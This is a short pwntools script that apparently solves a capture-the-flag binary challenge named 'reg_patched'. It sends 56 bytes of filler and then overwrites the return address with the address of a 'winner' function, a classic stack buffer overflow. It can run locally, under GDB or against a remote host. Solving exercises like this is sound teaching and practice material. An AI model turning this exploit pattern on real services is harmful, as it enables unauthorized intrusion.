#!/usr/bin/env python3

from pwn import *

e = ELF("./reg_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(run + 47)
                      c
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r

def main():
    r = conn()

    payload = flat({
                56: p64(e.symbols['winner']),
                }, filler=b'\x90')
    r.sendlineafter(b':', payload)

    r.interactive()

if __name__ == "__main__":
    main()
